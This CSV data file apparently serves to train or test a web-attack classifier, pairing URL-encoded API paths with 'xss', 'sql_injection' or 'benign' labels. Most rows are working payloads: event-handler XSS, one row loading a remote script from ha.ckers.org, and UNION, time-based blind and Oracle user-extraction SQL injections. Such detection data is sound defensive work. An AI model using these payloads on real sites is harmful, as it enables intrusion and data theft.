text,label
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Cwbr+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fwbr%3E,xss
/api/v1/comments?text=%3Cdt+onclick%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/api/v1/users/376418,benign
/v1/search?q=%3Cdiv+id%3D%22130%22%3E%3Cmath+href%3D%22javascript%3Aalert%28130%29%22%3ECLICKME%3C%2Fmath%3E,xss
/api/v2/comments/%3Cruby+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fruby%3E%3Cinput+autofocus%3E,xss
/api/v1/user/188074,benign
/api/v1/users?id=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26--,sql_injection
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cmarquee+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fmarquee%3E,xss
/v1/search?q=%3Ccenter+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Fcenter%3E,xss
/api/v2/items/%22%29%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520--?key=API_KEY,sql_injection
/api/v2/profile?id=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E,xss
/api/v1/feedback?message=%3Cprogress+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fprogress%3E,xss
/api/custom/items?api-version=2025-11-13-preview,benign
/api/v1/feedback?message=%3Cli+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fli%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Cxss+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fxss%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Crt+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Frt%3E,xss
/api/v1/reviews?body=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Cfooter+style%3D%22animation-name%3Ax%22+onanimationstart%3D%22alert%281%29%22%3E%3C%2Ffooter%3E,xss
/api/v1/comments?text=%3Cdiv+id%3D%22115%22%3E%3C%21--%5Bif%5D%3E%3Cscript%3Ealert%28115%29%3C%2Fscript+--%3E,xss
/v1/products/%22%2A%22,sql_injection
/api/v2/items/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%23?key=API_KEY,sql_injection
/api/v2/profile?id=%3Ccaption+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fcaption%3E,xss
/api/v2/comments/%3Cdt+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdt%3E,xss
/api/v2/comments/%3Cspan+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/comments?text=%3Ctime+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftime%3E,xss
/v1/search?q=%3Cth+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fth%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/feedback?message=%3Cstylesheet+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2FTR%2FWD-xsl%22%3E,xss
/v1/search?q=%3Cstrike+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fstrike%3E,xss
/v1/products/%22%29%29+and+0%3Dbenchmark%283000000%2CMD5%281%29%29%2520--,sql_injection
/api/v1/comments?text=%3Cnav+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fnav%3E%3Cinput+autofocus%3E,xss
/api/v1/comments?text=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfigure+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffigure%3E,xss
/api/v1/feedback?message=%3Cli+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fli%3E,xss
/api/v1/reviews?body=%3Chgroup+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cdata+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fdata%3E,xss
/api/v2/comments/%3Cfigcaption+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Ffigcaption%3E%3Cinput+autofocus%3E,xss
/v1/search?q=%3Cmap+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fmap%3E,xss
/v1/search?q=%3Cdiv+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fdiv%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%23,sql_injection
/api/v2/comments/%3Cwbr+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fwbr%3E,xss
/api/v1/products/378639,benign
/api/v2/search?q=1+and+user_name%28%29+%3D+%27dbo%27&key=API_KEY,sql_injection
/api/v1/reviews?body=%3Ch1+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Fh1%3E,xss
/api/v2/users/169126,benign
/v1/products/UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17,sql_injection
/api/v1/login?username=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6--&password=pass,sql_injection
/v1/orders?customer_id=or+0%3D0+--&status=active,sql_injection
/api/v2/profile?id=%3Ccaption+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcaption%3E,xss
/api/v2/comments/%3Cstyle%3E%3Atarget+%7Bcolor%3A+red%3B%7D%3C%2Fstyle%3E%3Cbr+id%3Dx+style%3D%22transition%3Acolor+10s%22+ontransitioncancel%3Dalert%281%29%3E%3C%2Fbr%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Csection+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fsection%3E,xss
/api/v1/comments?text=%3Clegend+onmouseenter%3D%22alert%281%29%22%3Etest%3C%2Flegend%3E,xss
/api/v1/reviews?body=%3Celement+draggable%3D%22true%22+ondragenter%3D%22alert%281%29%22%3Etest%3C%2Felement%3E,xss
/api/v1/user/public_key_01,benign
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Csamp+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Fsamp%3E,xss
/api/v2/profile?id=%3Csvg%3E%3Ccode+onload%3Dalert%281%29%3E%3C%2Fcode%3E,xss
/api/v2/profile?id=%3Ca+href%3Dhttp%3A%2F%2Ffoo.bar%2F%23x%3D%60y%3E%3C%2Fa%3E%3Cimg+alt%3D%22%60%3E%3Cimg+src%3Dxx%3Ax+onerror%3Dalert%28108%29%3E%3C%2Fa%3E%22%3E,xss
/api/v1/users?id=%22%29%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A,sql_injection
/api/v1/reviews?body=%3Cimage+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fimage%3E,xss
/api/v2/profile?id=%3Cheader+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fheader%3E,xss
/v1/orders?customer_id=or+%27text%27+%3E+%27t%27&status=active,sql_injection
/v1/profile?bio=%3Cul+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Ful%3E,xss
/api/v1/login?username=ORDER+BY+4--&password=pass,sql_injection
/v1/search?q=%3Crt+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Frt%3E%3Cinput+id%3Dy+autofocus%3E,xss
/admin/api/2024-04/orders/6734865.json,benign
/api/v1/search?q=%27+or+%27x%27%3D%27x,sql_injection
/api/v2/comments/%3Cvideo+onloadeddata%3Dalert%281%29%3E%3Csource+src%3D%22validvideo.mp4%22+type%3D%22video%2Fmp4%22%3E%3C%2Fvideo%3E,xss
/api/v1/search?q=ORDER+BY+28--,sql_injection
/api/v2/users/153584,benign
/api/v1/reviews?body=%3Csvg+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22+onload%3D%22alert%28document.domain%29%22%2F%3E,xss
/api/v1/search?q=UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27,sql_injection
/api/v1/users?id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%23,sql_injection
/api/v2/users/112667,benign
/v1/profile?bio=%3Cruby+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Fruby%3E,xss
/api/v2/profile?id=%3Ccommand+onkeypress%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fcommand%3E,xss
/v1/orders?customer_id=%27+AnD+SLEEP%285%29+ANd+%271&status=active,sql_injection
/api/v1/profile?id=645559,benign
/api/v2/items/ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%23?key=API_KEY,sql_injection
/v1/profile?bio=%3Cstyle%3E%3Atarget+%7Btransform%3A+rotate%28180deg%29%3B%7D%3C%2Fstyle%3E%3Ctt+id%3Dx+style%3D%22transition%3Atransform+2s%22+ontransitionrun%3Dalert%281%29%3E%3C%2Ftt%3E,xss
/v1/customers/cus_739244,benign
/api/v2/comments/%3Cinput+type%3Dcheckbox+id%3Dx+onfocus%3Dalert%281%29%3E,xss
/api/v1/feedback?message=%3Cmenuitem+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fmenuitem%3E,xss
/api/v2/profile?id=%3Cmenuitem+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Fmenuitem%3E%3Cinput+autofocus%3E,xss
/compute/v1/projects/proj-1330/zones/us-central1-a/instances/instance-19770,benign
/api/v2/items/UNION+SELECT+%40%40VERSION%2CSLEEP%285%29%2CUSER%28%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C5%2C6%2C7%23?key=API_KEY,sql_injection
/api/v1/products/531220,benign
/api/v2/items/%27%29%2CNULL%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A?key=API_KEY,sql_injection
/v1/search?q=%3Crp+draggable%3D%22true%22+ondrag%3D%22alert%281%29%22%3Etest%3C%2Frp%3E,xss
/api/v1/feedback?message=%3Ccanvas+oncontextmenu%3D%22alert%281%29%22%3Etest%3C%2Fcanvas%3E,xss
/api/v1/comments?text=%3Ciframe+draggable%3D%22true%22+ondragleave%3D%22alert%281%29%22%3Etest%3C%2Fiframe%3E,xss
/api/v1/search?q=%27+AND+1%3Dutl_inaddr.get_host_address%28%28SELECT+DISTINCT%28USERNAME%29+FROM+%28SELECT+DISTINCT%28USERNAME%29%2C+ROWNUM+AS+LIMIT+FROM+SYS.ALL_USERS%29+WHERE+LIMIT%3D3%29%29+AND+%27i%27%3D%27i,sql_injection
/v1/profile?bio=%3Cinput+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Finput%3E,xss
/api/v1/users?id=%29%3Bwaitfor+delay+%270%3A0%3A__TIME__%27--,sql_injection
/v1/profile?bio=%3Cmeter+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmeter%3E,xss
/api/v1/reviews?body=%3Ccaption+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Fcaption%3E,xss
/api/v1/feedback?message=%3Csummary+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fsummary%3E,xss
/v1/profile?bio=%3Cxmp+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Fxmp%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v2/users/1362,benign
/v1/search?q=%3Cmain+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmain%3E,xss
/v1/search?q=%3Cem+onfocusout%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fem%3E%3Cinput+autofocus%3E,xss
/api/v1/search?q=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%23,sql_injection
/v1/profile?bio=%3Cdl+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Fdl%3E,xss
/api/v1/comments?text=%3Cstyle%3E%40keyframes+x%7B%7D%3C%2Fstyle%3E%3Ctrack+style%3D%22animation-name%3Ax%22+onanimationend%3D%22alert%281%29%22%3E%3C%2Ftrack%3E,xss
/api/v1/users?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D0,sql_injection
/api/v1/login?username=declare+%40q+nvarchar+%28200%29+select+%40q+%3D+0x770061+...&password=pass,sql_injection
/api/v1/feedback?message=%3Cvideo+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fvideo%3E,xss
/api/v1/feedback?message=%3Ctd+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Ftd%3E%3Cinput+autofocus%3E,xss
/api/v2/profile?id=%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cembed+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fembed%3E,xss
/v1/profile?bio=%3Coutput+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Foutput%3E,xss
/api/v2/search?q=%2CNULL%2CNULL%2CNULL%29%2520waitfor%2520delay%2520%270%3A0%3A20%27%2520%2F%2A&key=API_KEY,sql_injection
/api/v2/profile?id=%3Cbasefont+onclick%3D%22alert%281%29%22%3Etest%3C%2Fbasefont%3E,xss
/v1/orders?customer_id=%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%29%2520--&status=active,sql_injection
/v1/products/fake%40ema%27or%27il.nl%27%3D%27il.nl,sql_injection
/api/v1/reviews?body=%3Cnoframes+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnoframes%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Capplet+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fapplet%3E,xss
/api/v2/search?q=%27+or+pg_sleep%285%29--&key=API_KEY,sql_injection
/api/v2/search?q=%27%29%29+or+pg_sleep%285%29--&key=API_KEY,sql_injection
/v1/search?q=%3Cbgsound+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbgsound%3E,xss
/v1/search?q=%3Caudio+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Faudio%3E,xss
/api/v1/comments?text=%3Ctitle+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Ftitle%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cxss+id%3Dx+tabindex%3D1+onfocusout%3Dalert%281%29%3E%3C%2Fxss%3E%3Cinput+autofocus%3E,xss
/api/v1/cart?user_id=848612&action=view,benign
/api/v2/comments/%3Ciframe+srcdoc%3D%3Csvg%2Fo,xss
/api/v1/feedback?message=%3Cmenu+onbeforepaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/v1/search?q=%3Cstyle%3E%40keyframes+x%7Bfrom+%7Bleft%3A0%3B%7Dto+%7Bleft%3A+1000px%3B%7D%7D%3Atarget+%7Banimation%3A10s+ease-in-out+0s+1+x%3B%7D%3C%2Fstyle%3E%3Capplet+id%3Dx+style%3D%22position%3Aabsolute%3B%22+onanimationcancel%3D%22alert%281%29%22%3E%3C%2Fapplet%3E,xss
/api/v2/profile?id=%3Cmeta+draggable%3D%22true%22+ondragend%3D%22alert%281%29%22%3Etest%3C%2Fmeta%3E,xss
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5,sql_injection
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20,sql_injection
/api/v2/comments/%3Cfigcaption+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Ffigcaption%3E,xss
/api/v1/comments?text=%3Cvar+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fvar%3E,xss
/api/v1/users?id=AS+INJECTX+WHERE+1%3D1+AND+1%3D1,sql_injection
/v1/orders?customer_id=ORDER+BY+1%2CSLEEP%285%29%2CBENCHMARK%281000000%2CMD5%28%27A%27%29%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%23&status=active,sql_injection
/v1/orders?customer_id=HAVING+1%3D0%23&status=active,sql_injection
/api/v1/comments?text=%3Ctr+onmouseup%3D%22alert%281%29%22%3Etest%3C%2Ftr%3E,xss
/v1/search?q=%3Cdiv+id%3D%22104%22%3E%3Csvg+xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22+id%3D%22foo%22%3E,xss
/api/v1/reviews?body=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cblockquote+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Fblockquote%3E,xss
/api/v2/profile?id=%3Cnoframes+id%3Dx+tabindex%3D1+onfocusin%3Dalert%281%29%3E%3C%2Fnoframes%3E,xss
/api/v1/users/709571,benign
/api/v1/users/356779,benign
/api/v1/reviews?body=%3Cdatalist+onbeforecut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdatalist%3E,xss
/v1/search?q=%3Cimage+onblur%3Dalert%281%29+tabindex%3D1+id%3Dx%3E%3C%2Fimage%3E%3Cinput+autofocus%3E,xss
/v1/profile?bio=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Cfont+ondragover%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ffont%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Cmeter+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fmeter%3E,xss
/api/v2/profile?id=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Csmall+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Fsmall%3E,xss
/api/v2/items/bfilename?key=API_KEY,sql_injection
/api/v1/reviews?body=%3Cdiv+onclick%3D%22alert%281%29%22%3Etest%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Cdt+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fdt%3E,xss
/api/v1/users?id=or+0%3D0+%23%22,sql_injection
/api/v1/reviews?body=%3Ctitle+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Ftitle%3E,xss
/v1/search?q=%3Crb+onmouseout%3D%22alert%281%29%22%3Etest%3C%2Frb%3E,xss
/api/v1/search?q=ORDER+BY+10,sql_injection
/api/v2/items/979135?key=33277,benign
/api/v1/users?id=UNION+ALL+SELECT+%27INJ%27%7C%7C%27ECT%27%7C%7C%27XXX%27%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%23,sql_injection
/api/v2/profile?id=%3Ckeygen+autofocus+onfocus%3Dalert%281%29%3E,xss
/api/v2/comments/%3Carea+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Farea%3E,xss
/api/v1/comments?text=%3Cscript%3E+var%2BMouseEvent%3Dfunction%2BMouseEvent%28%29%7B%7D%3B+MouseEvent%3DMouseEvent+var%2Btest%3Dnew%2BMouseEvent%28%29%3B+test.isTrusted%3Dtrue%3B+test.type%3D%27click%27%3B++document.getElementById%28%2522safe123%2522%29.click%3Dfunction%28%29%2B%7Balert%28Safe.get%28%29%29%3B%7D+document.getElementById%28%2522safe123%2522%29.click%28test%29%3B+%3C%2Fscript%3E,xss
/api/v1/feedback?message=%3Csub+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fsub%3E,xss
/api/v1/feedback?message=%3Cstyle%3E%3Atarget+%7Bcolor%3Ared%3B%7D%3C%2Fstyle%3E%3Ctd+id%3Dx+style%3D%22transition%3Acolor+1s%22+ontransitionend%3Dalert%281%29%3E%3C%2Ftd%3E,xss
/api/v2/search?q=UNION+ALL+SELECT+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17&key=API_KEY,sql_injection
/api/v2/profile?id=%3C%21--%5Bif%3Cimg+src%3Dx+onerror%3Dalert%282%29%2F%2F%5D%3E+--%3E%2F%2F%5B%22%27%60--%3E%5D%5D%3E%5D%3C%2Fdiv%3E,xss
/api/v1/feedback?message=%3Cframe+onmouseleave%3D%22alert%281%29%22%3Etest%3C%2Fframe%3E,xss
/api/v2/items/480103?key=AK-XY-999,benign
/api/v2/comments/%3Chgroup+onmousedown%3D%22alert%281%29%22%3Etest%3C%2Fhgroup%3E,xss
/api/v2/profile?id=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E,xss
/api/v2/search?q=or+%27something%27+%3D+%27some%27%2B%27thing%27&key=API_KEY,sql_injection
/v1/search?q=%3Cpicture+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fpicture%3E,xss
/v1/products/%27%2Bif%28benchmark%283000000%2CMD5%281%29%29%2CNULL%2CNULL%29%2CNULL%2CNULL%2CNULL%29%2520--,sql_injection
/v1/search?q=%3Cfieldset+draggable%3D%22true%22+ondragstart%3D%22alert%281%29%22%3Etest%3C%2Ffieldset%3E,xss
/api/v2/comments/%3Cnav+onbeforecopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fnav%3E,xss
/api/v1/reviews?body=%3Cspan+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fspan%3E,xss
/api/v1/feedback?message=%3Cdiv+id%3D%22137%22%3E%3Csvg%3E,xss
/v1/projects/proj-4574/locations/us-central1/datasets/ds_4574,benign
/v1/profile?bio=%3Ctemplate+id%3Dx+tabindex%3D1+ondeactivate%3Dalert%281%29%3E%3C%2Ftemplate%3E%3Cinput+id%3Dy+autofocus%3E,xss
/api/v1/reviews?body=%3Cbasefont+oncut%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fbasefont%3E,xss
/api/v1/users?id=%27+union+select+1%2C+%27%3Cuser-fieldname%3E%27%2C+%27%3Cpass-fieldname%3E%27+1--,sql_injection
/api/v1/reviews?body=%3Cmenu+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fmenu%3E,xss
/api/v1/search?q=AND+%28SELECT+%2A+FROM+%28SELECT%28SLEEP%285%29%29%29nQIP%29--,sql_injection
/api/v1/login?username=like&password=pass,sql_injection
/v1/search?q=%3Cbgsound+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Fbgsound%3E,xss
/api/v2/profile?id=%3Caudio+id%3Dx+tabindex%3D1+onbeforedeactivate%3Dalert%281%29%3E%3C%2Faudio%3E%3Cinput+autofocus%3E,xss
/api/v2/comments/%3Cabbr+onkeyup%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fabbr%3E,xss
/v1/buckets/bucket-data16/objects/file_74669.json,benign
/api/v1/feedback?message=%3Ccommand+onmousemove%3D%22alert%281%29%22%3Etest%3C%2Fcommand%3E,xss
/providers/Microsoft.Authorization/roleAssignments/122056?api-version=2020-10-01-preview,benign
/api/v1/reviews?body=%3Ca+href%3Djavascript%3Aalert%281%29%3Eclick,xss
/v1/profile?bio=%3Cdir+oncopy%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdir%3E,xss
/api/v2/comments/%3Coptgroup+id%3Dx+tabindex%3D1+onactivate%3Dalert%281%29%3E%3C%2Foptgroup%3E,xss
/api/v2/profile?id=%3Cdiv+draggable%3D%22true%22+contenteditable%3Edrag+me%3C%2Fdiv%3E%3Ctd+ondrop%3Dalert%281%29+contenteditable%3Edrop+here%3C%2Ftd%3E,xss
/api/v2/items/%27+and+%27one%27%3D%27one%C3%A2%E2%82%AC%E2%80%9C?key=API_KEY,sql_injection
/api/v2/search?q=391330&key=647848,benign
/v1/profile?bio=%3Cdel+onpaste%3D%22alert%281%29%22+contenteditable%3Etest%3C%2Fdel%3E,xss
/api/v1/search?q=800186,benign
/api/v2/comments/%3Cstyle%3E%40keyframes+slidein+%7B%7D%3C%2Fstyle%3E%3Cxmp+style%3D%22animation-duration%3A1s%3Banimation-name%3Aslidein%3Banimation-iteration-count%3A2%22+onanimationiteration%3D%22alert%281%29%22%3E%3C%2Fxmp%3E,xss
/api/v2/comments/%3Ctr+id%3Dx+tabindex%3D1+onbeforeactivate%3Dalert%281%29%3E%3C%2Ftr%3E,xss
